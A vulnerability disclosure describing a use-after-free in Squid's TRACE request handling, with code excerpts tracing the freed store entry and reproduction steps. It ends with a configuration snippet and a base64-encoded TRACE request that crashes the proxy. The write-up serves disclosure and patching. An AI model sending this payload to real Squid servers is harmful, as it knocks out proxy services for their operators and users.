# Use-After-Free in TRACE Requests
Just like GET, POST, HEAD, and others, RFC 7231 (HTTP/1.1) defines the TRACE method as an HTTP request method (verb) which is used for diagnosing HTTP requests. When the final destination server (rather than, say, an intermediate proxy server) receives a TRACE request, it should print out exactly the request it received.

The HTTP request header `max-forwards` is also used with TRACE requests, and it defines how many intermediate servers may be used before the response is sent back. A value of 0 means that the first server must send back a response. For requests which use a `max-forwards` value greater than 0, each intermediate server (should) de-increment the header by 1.

Squid is able to act as both an intermediate (`max-forwards > 0`) and origin server (`max-forwards = 0`) when it comes to TRACE requests.

## The Issue
When Squid acts as an origin server responding to a TRACE request (i.e. `max-forwards = 0`), the response is handled in the function ``clientReplyContext::traceReply``. Effectively, this function creates a copy of the request as it received it, and creates a reply with that request. This reply is then passed to ``StoreEntry::replaceHttpReply``, which also passed the reply to ``StoreEntry::startWriting``, to update the local storage with the reply.
However, ``StoreEntry::startWriting`` calls the function ``StoreEntry::flush``, which may free this entry and its associated memory in the case of some error occurring, such as the reply being too large due to, say, the configuration `reply_body_max_size`. The reply contains a url-encoded version of the URI requested, and as such, it is quite easy to reach an even high `reply_body_max_size` limit to cause the memory to be freed.

In ``StoreEntry::startWriting``:
```
void
StoreEntry::startWriting()
{
  …
  flush(); <--- may free 'this'.
  if (hittingRequiresCollapsing()) { <-- UaF
    setCollapsingRequirement(false); <-- UaF
    Store::Root().transientsClearCollapsingRequirement(*this); <-- UaF
  }
}
```

If "nothing goes wrong" so-to-speak during the three lines of code highlighted, Squid will return all the way back to ``traceReply``, where the freed store entry will be passed to ``swapOut``: ``http->request->swapOut(http->storeEntry());``
From here, another use-after-free happens: ``EBIT_SET(flags, DELAY_SENDING);`` before finally, an assertion is likely to happen: ``assertion failed: store.cc:832: "store_status == STORE_PENDING"``.

In order to reproduce this issue, set in your Squid configuration:
```
max-forwards = 0
reply_body_max_size 1 KB
```

and send a request to Squid using the base64-encoded request:
```
dFJhY2UgaHR0cDovLzAwMDAwMDAwMIwwMDAwMDAwMFMgMDAwMD+srLmsMDAwMDAwMDAwMDAwMDAw
MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAw
MDAwMDAwMDCsrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKyyrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrDAwMKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysmKysrKysrKysrKys
rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKys
rKysrKysrKysrKysrKwwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgSFRUUC8xLjAN
Ckhvc3Q6ClVzZXItQWdlbnQ6Cm1heC1mb3J3YXJkczowCgpACg==
```
